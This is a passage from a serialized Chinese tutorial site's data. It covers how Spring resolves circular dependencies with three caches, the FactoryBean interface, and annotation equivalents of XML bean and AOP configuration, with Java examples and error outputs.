b 的属性值进行填充，此时 b 的属性依赖了 a，就要调用 getbean 找 a\n 5. 此时的 a 已经在三级缓存，可以在三级缓存中找到，找到后会生成 a 代理对象 放入 earlysingletonobjects 二级缓存并返回这个代理对象\n 6. b 有了属性 a 的代理对象，此时 b 所有属性填充完毕后，就要把 b 添加到一级缓存，但此时的 b 在三级缓存，会先把三级缓存对象生成代理后放入到 earlysingletonobjects 二级缓存，再由二级缓存把对象放到 singletonobjects 一级缓存对象\n 7. 此时的 b 已经放到一级缓存对象了，并结束了 b 的创建流程，所以会返回到第 2 步，a 就有了 b 的实例，a 的属性填充完毕后，就要把 a 添加到一级缓存，但此时的 a 已经在二级缓存，所以就可以直接放入到 singletonobjects 一级缓存\n\n现在我们知道，按照 spring 框架的设计，用于解决循环依赖需要用到三个缓存，这三个缓存分别存放了 singletonobjects 成品对象、singletonfactories 半成品对象 (未填充属性值)、earlysingletonobjects 代理对象，分阶段存放对象内容，来解决循环依赖问题。\n\n那么，这里我们需要知道一个核心的原理，就是用于解决循环依赖就必须是三级缓存呢，二级行吗？一级可以不？其实都能解决，只不过 spring 框架的实现要保证几个事情，如只有一级缓存处理流程没法拆分，复杂度也会增加，同时半成品对象可能会有空指针异常。而将半成品与成品对象分开，处理起来也更加优雅、简单、易扩展。另外 spring 的两大特性中不仅有 ioc 还有 aop，也就是基于字节码增强后的方法，该存放到哪，而三级缓存最主要，要解决的循环依赖就是对 aop 的处理，但如果把 aop 代理对象的创建提前，那么二级缓存也一样可以解决。但是，这就违背了 spring 创建对象的原则，spring 更喜欢把所有的普通 bean 都初始化完成，在处理代理对象的初始化。\n\n一个单个缓存解决循环依赖的例子\n\npublic class forrelyon {\n\n    static map<string,object> singletonobjects = new hashmap<>();\n\n    public static void main(string[] args) throws exception {\n        system.out.println(getbean(a.class).getb());\n        system.out.println(getbean(b.class).geta());\n    }\n\n    private static <t> t getbean(class<t> beanclass) throws exception {\n        string beanname = beanclass.getsimplename().tolowercase();\n        if (singletonobjects.containskey(beanname)) {\n            return (t) singletonobjects.get(beanname);\n        }\n        // 实例化对象入缓存0\n        object obj = beanclass.newinstance();\n        singletonobjects.put(beanname, obj);\n        // 属性填充补全对象\n        field[] fields = obj.getclass().getdeclaredfields();\n        for (field field : fields) {\n            field.setaccessible(true);\n            class<?> fieldclass = field.gettype();\n            string fieldbeanname = fieldclass.getsimplename().tolowercase();\n            field.set(obj, singletonobjects.containskey(fieldbeanname) ? singletonobjects.get(fieldbeanname) : getbean(fieldclass));\n            field.setaccessible(false);\n        }\n        return (t) obj;\n    }\n\n\n    static class a{\n        private b b;\n\n        public b getb() {\n            return b;\n        }\n\n        public void setb(b b) {\n            this.b = b;\n        }\n    }\n\n    static class b{\n        private a a;\n\n        public a geta() {\n            return a;\n        }\n\n        public void seta(a a) {\n            this.a = a;\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\n提示\n\n以上都是我们通过 单例的 set 注入方式来解决循环依赖，在 spring 中有多种多样的注入情况，那会带来什么样的情况呢？\n\n\n# 不同的循环依赖问题\n\n\n# set 循环依赖\n\n在多例 set 的循环依赖中，只有多例和多例循环依赖会出现报错，报错信息如下：\n\nerror creating bean with name 'b': injection of resource dependencies failed; nested exception is org.springframework.beans.factory.beancreationexception: error creating bean with name 'a': injection of resource dependencies failed; nested exception is org.springframework.beans.factory.beancurrentlyincreationexception: error creating bean with name 'b': requested bean is currently in creation: is there an unresolvable circular reference?\n\n\n1\n\n\n多例和单例的循环依赖不会有问题，如下是一个单例和多例的循环依赖代码：\n\n@component\npublic class a {\n    @resource\n    private b b;\n    public void getb() {\n        system.out.println(b);\n    }\n}\n\n@scope(configurablebeanfactory.scope_prototype)\n@component\npublic class b {\n    @resource\n    private a a;\n    public void geta(){\n        system.out.println(a);\n    }\n}\n\npublic static void main(string[] args) {\n    configurableapplicationcontext run = springapplication.run(adminapplication.class, args);\n    b b = run.getbean(b.class);\n    b b1 = run.getbean(b.class);\n    b b2 = run.getbean(b.class);\n    a a = run.getbean(a.class);\n    a a1 = run.getbean(a.class);\n    a a2 = run.getbean(a.class);\n    system.out.println(b);\n    system.out.println(b1);\n    system.out.println(b2);\n    a.getb();\n    a1.getb();\n    a2.getb();\n}\n\n// 结果\ncom.wt.admin.controller.b@1e5e2e06\ncom.wt.admin.controller.b@26c1f3eb\ncom.wt.admin.controller.b@79982bcc\ncom.wt.admin.controller.b@16b2d182\ncom.wt.admin.controller.b@16b2d182\ncom.wt.admin.controller.b@16b2d182\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n\n# 构造器 循环依赖\n\n但在 构造器 循环依赖的注入中，因为在构造器注入方式下，需要先创建一个 bean 对象，然后再将其他 bean 注入该对象中。但是，如果两个 bean 都互相依赖，那么就会出现无法创建任何一个 bean 的情况。因此，spring 在这种情况下会抛出异常以避免程序出现不可预测的错误。\n\n@configuration\npublic class config {\n    @bean\n    public a a(b b){\n        return new a(b);\n    }\n    @bean\n    public b b(a a){\n        return new b(a);\n    }\n}\n// 报错\nthe dependencies of some of the beans in the application context form a cycle:\n┌─────┐\n|  a defined in class path resource [com/wt/admin/controller/config.class]\n↑     ↓\n|  b defined in class path resource [com/wt/admin/controller/config.class]\n└─────┘\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n解决这种问题，可以通过在方法中添加 @lazy 注解，只能加到方法里，不能加到 @bean 的上下位置，否则依然会报循环依赖；这种方式尽可能的被定义为 @lazy 的 bean 在第一次被使用的时候在去进行实例化。\n\n构造器也存在多例和单例的问题，如果你是多例依赖循环，会报错，如下\n\n// 多例\n@configuration\npublic class config {\n    @scope(configurablebeanfactory.scope_prototype)\n    @bean\n    public a a(b b){\n        return new a(b);\n    }\n    @scope(configurablebeanfactory.scope_prototype)\n    @bean\n    public b b(a a){\n        return new b(a);\n    }\n}\n// 报错信息\nerror creating bean with name 'b' defined in class path resource [com/wt/admin/controller/config.class]: unsatisfied dependency expressed through method 'b' parameter 0; nested exception is org.springframework.beans.factory.unsatisfieddependencyexception: error creating bean with name 'a' defined in class path resource [com/wt/admin/controller/config.class]: unsatisfied dependency expressed through method 'a' parameter 0; nested exception is org.springframework.beans.factory.beancurrentlyincreationexception: error creating bean with name 'b': requested bean is currently in creation: is there an unresolvable circular reference?\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n如果你是多例和单例循环依赖，也会报错，但这里和我们使用注解进行多例和单例的循环依赖测试结果就有所不同了\n\n@configuration\npublic class config {\n    @scope(configurablebeanfactory.scope_prototype)\n    @bean\n    public a a(b b){\n        return new a(b);\n    }\n    @bean\n    public b b(a a){\n        return new b(a);\n    }\n}\n// 报错信息\nthe dependencies of some of the beans in the application context form a cycle:\n┌─────┐\n|  b defined in class path resource [com/wt/admin/controller/config.class]\n↑     ↓\n|  a defined in class path resource [com/wt/admin/controller/config.class]\n└─────┘\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n那么构造器和 set 注入的方式在多例和单例的结论如下：\n\n * 单例循环依赖：构造器的方式会报错（可以用 @lazy 解决），set 注入的方式不会报错\n * 多例循环依赖：构造器的方式会报错，set 注入的方式会报错，两者都是调用对象时才报\n * 单例和多例循环依赖：构造器的方式会报错（可以用 @lazy 解决），set 注入的方式不会报错\n\n\n# @dependson\n\n@dependson 注解可以定义在类和⽅法上，意思是我这个组件要依赖于另⼀个组件，也就是说被依赖的组件会⽐该组件先注册到 ioc 容器中。如下案例，因为两个都要先于，所以造成了循环依赖\n\n@dependson(\"b\")\n@component\npublic class a {\n    @resource\n    private b b;\n    public void getb() {\n        system.out.println(b);\n    }\n}\n\n@dependson(\"a\")\n@component\npublic class b {\n    @resource\n    private a a;\n    public void geta(){\n        system.out.println(a);\n    }\n}\n// 报错\nerror creating bean with name 'b' defined in file [d:\\workspace\\luckydraw\\java\\target\\classes\\com\\wt\\admin\\controller\\b.class]: circular depends-on relationship between 'b' and 'a'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n",charsets:{cjk:!0}},{title:"核心内容拆解 FactoryBean",frontmatter:{title:"核心内容拆解 FactoryBean",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/204/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/21.spring/204.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20FactoryBean.html",relativePath:"00.java/20.Spring/21.spring/204.核心内容拆解 FactoryBean.md",key:"v-1e178af1",path:"/spring/spring/204/",lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:null,content:'FactoryBean 接口，使得我们可以通过编写自定义代码来实现 Bean 的实例化和注入。具体来说，通过实现 FactoryBean 接口，我们可以在 getObject () 方法中编写自己的逻辑来实例化 Bean，同时可以在 getObjectType () 方法中指定返回的类型。因此，FactoryBean 的主要作用是对 Bean 的创建过程进行个性化定制，使得我们能够更好地控制 Spring 容器中 Bean 的生命周期和行为。同时，它还可以支持单例模式或者原型模式的 Bean 创建方式，更进一步增强了 Spring 容器的灵活性。\n\npublic interface FactoryBean<T> {\n    // 获取对象\n    T getObject() throws Exception;\n    // 获取对象类型\n    Class<?> getObjectType();\n    // 判断是否单例\n    boolean isSingleton();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n在 《核心功能拆解 IOC》 一文中，当一个 Bean 对象的创建结束，并得到所创建的 Bean 后，会继续执行 getObjectForBeanInstance 方法\n\n   protected <T> T doGetBean(final String name, final Object[] args) {\n        // 从缓存中获取实例\n        Object sharedInstance = getSingleton(name);\n        if (sharedInstance != null) {\n            // 如果实现了 FactoryBean，则需要调用 FactoryBean#getObject\n            return (T) getObjectForBeanInstance(sharedInstance, name);\n        }\n        // 从BeanDefinition列表中获取对象\n        BeanDefinition beanDefinition = getBeanDefinition(name);\n        Object bean = createBean(name, beanDefinition, args);\n        // 如果实现了 FactoryBean，则需要调用 FactoryBean#getObject\n        return (T) getObjectForBeanInstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n该方法用于判断一个 Bean 是否实现了 FactoryBean 接口，如果实现了接口则需要进行对应的操作\n\nprivate Object getObjectForBeanInstance(Object beanInstance, String beanName) {\n    if (!(beanInstance instanceof FactoryBean)) {\n        return beanInstance;\n    }\n    // 查询 Bean 是否已被执行过\n    Object object = getCachedObjectForFactoryBean(beanName);\n    if (object == null) {\n        // 转成 FactoryBean\n        FactoryBean<?> factoryBean = (FactoryBean<?>) beanInstance;\n        // 具体执行\n        object = getObjectFromFactoryBean(factoryBean, beanName);\n    }\n    return object;\n}\n\nprotected Object getObjectFromFactoryBean(FactoryBean factory, String beanName) {\n    // 判断是否单例，单例会添加到 factoryBeanObjectCache 改该Map中，避免重复\n    if (factory.isSingleton()) {\n        // 获取\n        Object object = this.factoryBeanObjectCache.get(beanName);\n        // 判断是否存在\n        if (object == null) {\n            // 执行\n            object = doGetObjectFromFactoryBean(factory, beanName);\n            this.factoryBeanObjectCache.put(beanName, (object != null ? object : NULL_OBJECT));\n        }\n        return (object != NULL_OBJECT ? object : null);\n    } else {\n        return doGetObjectFromFactoryBean(factory, beanName);\n    }\n}\n\nprivate Object doGetObjectFromFactoryBean(final FactoryBean factory, final String beanName){\n    try {\n        // 调用接口方法\n        return factory.getObject();\n    } catch (Exception e) {\n        throw new BeansException("FactoryBean threw exception on object[" + beanName + "] creation", e);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n这种方式可以理解为，实现 FactoryBean 的类是一个代理类，他的工作主要是在自己被创建的时候，按照 Spring 的生命周期，创建自己的实例，填充属性，初始化之前执行，初始化执行，初始化之后执行，这一切都只是为被代理类做好条件铺设，等这个代理类创建完毕后，会执行 getObjectForBeanInstance 方法，返回被代理的类。更简单的理解就是 FactoryBean 可以帮我们制造我们想要的 Bean，供其他 Bean 依赖或使用。',normalizedContent:'factorybean 接口，使得我们可以通过编写自定义代码来实现 bean 的实例化和注入。具体来说，通过实现 factorybean 接口，我们可以在 getobject () 方法中编写自己的逻辑来实例化 bean，同时可以在 getobjecttype () 方法中指定返回的类型。因此，factorybean 的主要作用是对 bean 的创建过程进行个性化定制，使得我们能够更好地控制 spring 容器中 bean 的生命周期和行为。同时，它还可以支持单例模式或者原型模式的 bean 创建方式，更进一步增强了 spring 容器的灵活性。\n\npublic interface factorybean<t> {\n    // 获取对象\n    t getobject() throws exception;\n    // 获取对象类型\n    class<?> getobjecttype();\n    // 判断是否单例\n    boolean issingleton();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n在 《核心功能拆解 ioc》 一文中，当一个 bean 对象的创建结束，并得到所创建的 bean 后，会继续执行 getobjectforbeaninstance 方法\n\n   protected <t> t dogetbean(final string name, final object[] args) {\n        // 从缓存中获取实例\n        object sharedinstance = getsingleton(name);\n        if (sharedinstance != null) {\n            // 如果实现了 factorybean，则需要调用 factorybean#getobject\n            return (t) getobjectforbeaninstance(sharedinstance, name);\n        }\n        // 从beandefinition列表中获取对象\n        beandefinition beandefinition = getbeandefinition(name);\n        object bean = createbean(name, beandefinition, args);\n        // 如果实现了 factorybean，则需要调用 factorybean#getobject\n        return (t) getobjectforbeaninstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n该方法用于判断一个 bean 是否实现了 factorybean 接口，如果实现了接口则需要进行对应的操作\n\nprivate object getobjectforbeaninstance(object beaninstance, string beanname) {\n    if (!(beaninstance instanceof factorybean)) {\n        return beaninstance;\n    }\n    // 查询 bean 是否已被执行过\n    object object = getcachedobjectforfactorybean(beanname);\n    if (object == null) {\n        // 转成 factorybean\n        factorybean<?> factorybean = (factorybean<?>) beaninstance;\n        // 具体执行\n        object = getobjectfromfactorybean(factorybean, beanname);\n    }\n    return object;\n}\n\nprotected object getobjectfromfactorybean(factorybean factory, string beanname) {\n    // 判断是否单例，单例会添加到 factorybeanobjectcache 改该map中，避免重复\n    if (factory.issingleton()) {\n        // 获取\n        object object = this.factorybeanobjectcache.get(beanname);\n        // 判断是否存在\n        if (object == null) {\n            // 执行\n            object = dogetobjectfromfactorybean(factory, beanname);\n            this.factorybeanobjectcache.put(beanname, (object != null ? object : null_object));\n        }\n        return (object != null_object ? object : null);\n    } else {\n        return dogetobjectfromfactorybean(factory, beanname);\n    }\n}\n\nprivate object dogetobjectfromfactorybean(final factorybean factory, final string beanname){\n    try {\n        // 调用接口方法\n        return factory.getobject();\n    } catch (exception e) {\n        throw new beansexception("factorybean threw exception on object[" + beanname + "] creation", e);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n这种方式可以理解为，实现 factorybean 的类是一个代理类，他的工作主要是在自己被创建的时候，按照 spring 的生命周期，创建自己的实例，填充属性，初始化之前执行，初始化执行，初始化之后执行，这一切都只是为被代理类做好条件铺设，等这个代理类创建完毕后，会执行 getobjectforbeaninstance 方法，返回被代理的类。更简单的理解就是 factorybean 可以帮我们制造我们想要的 bean，供其他 bean 依赖或使用。',charsets:{cjk:!0}},{title:"注解替代Spring生命周期实现类",frontmatter:{title:"注解替代Spring生命周期实现类",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/205/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/21.spring/205.%E6%B3%A8%E8%A7%A3%E6%9B%BF%E4%BB%A3Spring%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%AE%9E%E7%8E%B0%E7%B1%BB.html",relativePath:"00.java/20.Spring/21.spring/205.注解替代Spring生命周期实现类.md",key:"v-7b24cf72",path:"/spring/spring/205/",headers:[{level:2,title:"Spring IOC",slug:"spring-ioc",normalizedTitle:"spring ioc",charIndex:151},{level:3,title:"@Bean",slug:"bean",normalizedTitle:"@bean",charIndex:166},{level:3,title:"@Scope",slug:"scope",normalizedTitle:"@scope",charIndex:307},{level:3,title:"@PostConstruct",slug:"postconstruct",normalizedTitle:"@postconstruct",charIndex:352},{level:3,title:"@PreDestroy",slug:"predestroy",normalizedTitle:"@predestroy",charIndex:389},{level:3,title:"Spring DI",slug:"spring-di",normalizedTitle:"spring di",charIndex:426},{level:3,title:"@Autowired",slug:"autowired",normalizedTitle:"@autowired",charIndex:644},{level:3,title:"@Qualifier",slug:"qualifier",normalizedTitle:"@qualifier",charIndex:759},{level:3,title:"@Resource",slug:"resource",normalizedTitle:"@resource",charIndex:936},{level:3,title:"@Value",slug:"value",normalizedTitle:"@value",charIndex:1155},{level:2,title:"Spring AOP",slug:"spring-aop",normalizedTitle:"spring aop",charIndex:1196},{level:3,title:"@Aspect",slug:"aspect",normalizedTitle:"@aspect",charIndex:1211},{level:3,title:"@Before",slug:"before",normalizedTitle:"@before",charIndex:1246},{level:3,title:"@AfterReturning",slug:"afterreturning",normalizedTitle:"@afterreturning",charIndex:1281},{level:3,title:"@AfterThrowing",slug:"afterthrowing",normalizedTitle:"@afterthrowing",charIndex:1335},{level:3,title:"@After",slug:"after",normalizedTitle:"@after",charIndex:1281},{level:3,title:"@Around",slug:"around",normalizedTitle:"@around",charIndex:1420},{level:2,title:"其他注解",slug:"其他注解",normalizedTitle:"其他注解",charIndex:1455},{level:3,title:"@Order",slug:"order",normalizedTitle:"@order",charIndex:1464},{level:4,title:"错误使用",slug:"错误使用",normalizedTitle:"错误使用",charIndex:1765},{level:4,title:"正确使用",slug:"正确使用",normalizedTitle:"正确使用",charIndex:2381},{level:3,title:"@AutoConfigureOrder",slug:"autoconfigureorder",normalizedTitle:"@autoconfigureorder",charIndex:3008}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"Spring IOC @Bean @Scope @PostConstruct @PreDestroy Spring DI @Autowired @Qualifier @Resource @Value Spring AOP @Aspect @Before @AfterReturning @AfterThrowing @After @Around 其他注解 @Order 错误使用 正确使用 @AutoConfigureOrder",content:'在早期的 Spring 中，我们都是使用 XML 来进行相应的 Bean 依赖描述和属性描述，但在 Spring Boot 中大多还是习惯使用注解的方式来实现，那这里我就来总结下在 Spring 生命周期中，有哪些类提供了扩展可以给我们实现，以及原先 xml 的方式和注解方式的两种实现方式。\n\n\n# Spring IOC\n\n\n# @Bean\n\n<bean id="student" class="com.xinhua.study.bean.Student" scope="prototype" init-method="init()" destroy-method="destroy()"/>\n\n\n1\n\n\n\n# @Scope\n\nscope="singleton/prototype"\n\n\n1\n\n\n\n# @PostConstruct\n\ninit-method\n\n\n1\n\n\n\n# @PreDestroy\n\ndestroy-method\n\n\n1\n\n\n\n# Spring DI\n\nAutowired+Qualifier=Resource 这就是他们三者的关系，Autowired 根据类型找实现类，一个接口有多个实现类时需要通过 Qualifier 来指明需要哪个实现类，这是就需要 Autowired+Qualifier 一起使用才可以。Resource 则是不声明名称时按照类型查找效果与 Autowired 相同，声明名称时就等于 Autowired+Qualifier 的组合\n\n\n# @Autowired\n\n@Autowired 可以单独使用。如果单独使用，它将按类型装配。因此，如果在容器中声明了多个相同类型的 bean，则会出现问题，因为 @Autowired 不知道要使用哪个 bean 来注入。因此，使用 @Qualifier 与 @Autowired 一起，通过指定 bean 名称来阐明实际装配的 bean\n\nref="类型"\n\n\n1\n\n\n\n# @Qualifier\n\n@Qualifier 默认按名称装配（这个注解是属于 spring 的），value 默认 @Qualifier (value = "") 空值。\n\nref="类型"\n\n\n1\n\n\n\n# @Resource\n\n@Resource（这个注解属于 J2EE 的），默认按照名称进行装配，名称可以通过 name 属性进行指定， 如果没有指定 name 属性，当注解写在字段上时，默认取字段名进行按照名称查找，如果注解写在 setter 方法上默认取属性名进行装配。 当找不到与名称匹配的 bean 时才按照类型进行装配。但是需要注意的是，如果 name 属性一旦指定，就只会按照名称进行装配。\n\nref="类型"\n\n\n1\n\n\n\n# @Value\n\n给基本数据类型赋值\n\nref="基础数据类型"\n\n\n1\n\n\n\n# Spring AOP\n\n\n# @Aspect\n\n声明界面\n\napo:aspect\n\n\n1\n\n\n\n# @Before\n\n前置通知\n\napo:before\n\n\n1\n\n\n\n# @AfterReturning\n\n后置正常通知\n\naop:after-returning\n\n\n1\n\n\n\n# @AfterThrowing\n\n后置异常通知\n\naop:after-throwing\n\n\n1\n\n\n\n# @After\n\n最终通知\n\naop:after\n\n\n1\n\n\n\n# @Around\n\n环绕通知\n\naop:around\n\n\n1\n\n\n\n# 其他注解\n\n\n# @Order\n\n最开始 Order 注解用于切面的优先级指定；在 4.0 之后对它的功能进行了增强，支持集合的注入时，指定集合中 bean 的顺序，并且特别指出了，它对于单实例的 bean 之间的顺序，没有任何影响。\n\n注解 @Order 或者接口 Ordered 的作用是定义 Spring IOC 容器中 Bean 的执行顺序的优先级，而不是定义 Bean 的加载顺序，Bean 的加载顺序不受 @Order 或 Ordered 接口的影响；\n\n@Order 注解不能指定 bean 的加载顺序，它适用于 AOP 的优先级，以及将多个 Bean 注入到集合时，这些 bean 在集合中的顺序\n\n# 错误使用\n\n// 错误使用方法 1\n@Component\n@Order(2)\npublic class OrderA {\n    public OrderA() {\n        System.out.println("************ A ************");\n    }\n}\n\n@Component\n@Order(1)\npublic class OrderB {\n    public OrderB() {\n        System.out.println("************ B ************");\n    }\n}\n// 错误使用方法 2\n@Configuration\npublic class OrderBeanConfig {\n \n    @Order(2)\n    @Bean\n    public OrderC orderC() {\n        return new OrderC();\n    }\n \n    @Order(1)\n    @Bean\n    public OrderD orderD() {\n        return new OrderD();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n# 正确使用\n\n@Component\n@Order(value = 3)\npublic class AnoBeanA implements IBean{\n    public AnoBeanA() {\n        System.out.println("************ AnoBean A ************");\n    }\n}\n\n@Component\n@Order(value = 2)\npublic class AnoBeanB implements IBean{\n \n    public AnoBeanB() {\n        System.out.println("************ AnoBean B ************");\n    }\n}\n\n@Component\npublic class AnoBean {\n    public AnoBean(List<IBean> anoBeanList) {\n        for (IBean bean : anoBeanList) {\n            System.out.println("in ano testBean: "+ bean.getClass())\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# @AutoConfigureOrder\n\n@AutoConfigureOrder 指定外部依赖的 AutoConfig 的加载顺序（即定义在 / META-INF/spring.factories 文件中的配置 bean 优先级)，在当前工程中使用这个注解并没有什么用，同样的 @AutoConfigureBefore 和 @AutoConfigureAfter 这两个注解的适用范围和 @AutoConfigureOrder 一样',normalizedContent:'在早期的 spring 中，我们都是使用 xml 来进行相应的 bean 依赖描述和属性描述，但在 spring boot 中大多还是习惯使用注解的方式来实现，那这里我就来总结下在 spring 生命周期中，有哪些类提供了扩展可以给我们实现，以及原先 xml 的方式和注解方式的两种实现方式。\n\n\n# spring ioc\n\n\n# @bean\n\n<bean id="student" class="com.xinhua.study.bean.student" scope="prototype" init-method="init()" destroy-method="destroy()"/>\n\n\n1\n\n\n\n# @scope\n\nscope="singleton/prototype"\n\n\n1\n\n\n\n# @postconstruct\n\ninit-method\n\n\n1\n\n\n\n# @predestroy\n\ndestroy-method\n\n\n1\n\n\n\n# spring di\n\nautowired+qualifier=resource 这就是他们三者的关系，autowired 根据类型找实现类，一个接口有多个实现类时需要通过 qualifier 来指明需要哪个实现类，这是就需要 autowired+qualifier 一起使用才可以。resource 则是不声明名称时按照类型查找效果与 autowired 相同，声明名称时就等于 autowired+qualifier 的组合\n\n\n# @autowired\n\n@autowired 可以单独使用。如果单独使用，它将按类型装配。因此，如果在容器中声明了多个相同类型的 bean，则会出现问题，因为 @autowired 不知道要使用哪个 bean 来注入。因此，使用 @qualifier 与 @autowired 一起，通过指定 bean 名称来阐明实际装配的 bean\n\nref="类型"\n\n\n1\n\n\n\n# @qualifier\n\n@qualifier 默认按名称装配（这个注解是属于 spring 的），value 默认 @qualifier (value = "") 空值。\n\nref="类型"\n\n\n1\n\n\n\n# @resource\n\n@resource（这个注解属于 j2ee 的），默认按照名称进行装配，名称可以通过 name 属性进行指定， 如果没有指定 name 属性，当注解写在字段上时，默认取字段名进行按照名称查找，如果注解写在 setter 方法上默认取属性名进行装配。 当找不到与名称匹配的 bean 时才按照类型进行装配。但是需要注意的是，如果 name 属性一旦指定，就只会按照名称进行装配。\n\nref="类型"\n\n\n1\n\n\n\n# @value\n\n给基本数据类型赋值\n\nref="基础数据类型"\n\n\n1\n\n\n\n# spring aop\n\n\n# @aspect\n\n声明界面\n\napo:aspect\n\n\n1\n\n\n\n# @before\n\n前置通知\n\napo:before\n\n\n1\n\n\n\n# @afterreturning\n\n后置正常通知\n\naop:after-returning\n\n\n1\n\n\n\n# @afterthrowing\n\n后置异常通知\n\naop:after-throwing\n\n\n1\n\n\n\n# @after\n\n最终通知\n\naop:after\n\n\n1\n\n\n\n# @around\n\n环绕通知\n\naop:around\n\n\n1\n\n\n\n# 其他注解\n\n\n# @order\n\n最开始 order 注解用于切面的优先级指定；在 4.0 之后对它的功能进行了增强，支持集合的注入时，指定集合中 bean 的顺序，并且特别指出了，它对于单实例的 bean 之间的顺序，没有任何影响。\n\n注解 @order 或者接口 ordered 的作用是定义 spring ioc 容器中 bean 的执行顺序的优先级，而不是定义 bean 的加载顺序，bean 的加载顺序不受 @order 或 ordered 接口的影响；\n\n@order 注解不能指定 bean 的加载顺序，它适用于 aop 的优先级，以及将多个 bean 注入到集合时，这些 bean 在集合中的顺序\n\n# 错误使用\n\n// 错误使用方法 1\n@component\n@order(2)\npublic class ordera {\n    public ordera() {\n        system.out.println("************ a ************");\n    }\n}\n\n@component\n@order(1)\npublic class orderb {\n    public orderb() {\n        system.out.println("************ b ************");\n    }\n}\n// 错误使用方法 2\n@configuration\npublic class orderbeanconfig {\n \n    @order(2)\n    @bean\n    public orderc orderc() {\n        return new orderc();\n    }\n \n    @order(1)\n    @bean\n    public orderd orderd() {\n        return new orderd();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n# 正确使用\n\n@component\n@order(value = 3)\npublic class anobeana implements ibean{\n    public anobeana() {\n        system.out.println("************ anobean a ************");\n    }\n}\n\n@component\n@order(value = 2)\npublic class anobeanb implements ibean{\n \n    public anobeanb() {\n        system.out.println("************ anobean b ************");\n    }\n}\n\n@component\npublic class anobean {\n    public anobean(list<ibean> anobeanlist) {\n        for (ibean bean : anobeanlist) {\n            system.out.println("in ano testbean: "+ bean.getclass())\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# @autoconfigureorder\n\n@autoconfigureorder 指定外部依赖的 autoconfig 的加载顺序（即定义在 / meta-inf/spring.factories 文件中的配置 bean 优先级)，在当前工程中使用这个注解并没有什么用，同样的 @autoconfigurebefore 和 @autoconfigureafter 这两个注解的适用范围和 @autoconfigureorder 一样',charsets:{cjk:!0}},{title:"Spring MVC 之基本工作原理",frontmatter:{title:"Spring MVC 之基本工作原理",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-mvc/200/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/22.spring%20mv/200.Spring%20MVC%20%E4%B9%8B%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86.html",relativePath:"00.java/20.Spring/22.spring mv/200.Spring MVC 之工作原理.md",key:"v-7c3f2df1",path:"/spring/spring-mvc/200/",headers:[{level:2,title:"搭建",slug:"搭建",normalizedTitle:"搭建",charIndex:2},{level:2,title:"DispatcherServlet 初始化讲解",slug:"dispatcherservlet-初始化讲解",normalizedTitle:"dispatcherservlet 初始化讲解",charIndex:2998},{level:2,title:"父子容器",slug:"父子容器",normalizedTitle:"父子容器",charIndex:6566},{level:2,title:"代码取代xml配置",slug:"代码取代xml配置",normalizedTitle:"代码取代 xml 配置",charIndex:8920},{level:2,title:"请求实现",slug:"请求实现",normalizedTitle:"请求实现",charIndex:10086}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"搭建 DispatcherServlet 初始化讲解 父子容器 代码取代xml配置 请求实现",content:'# 搭建\n\n 1. 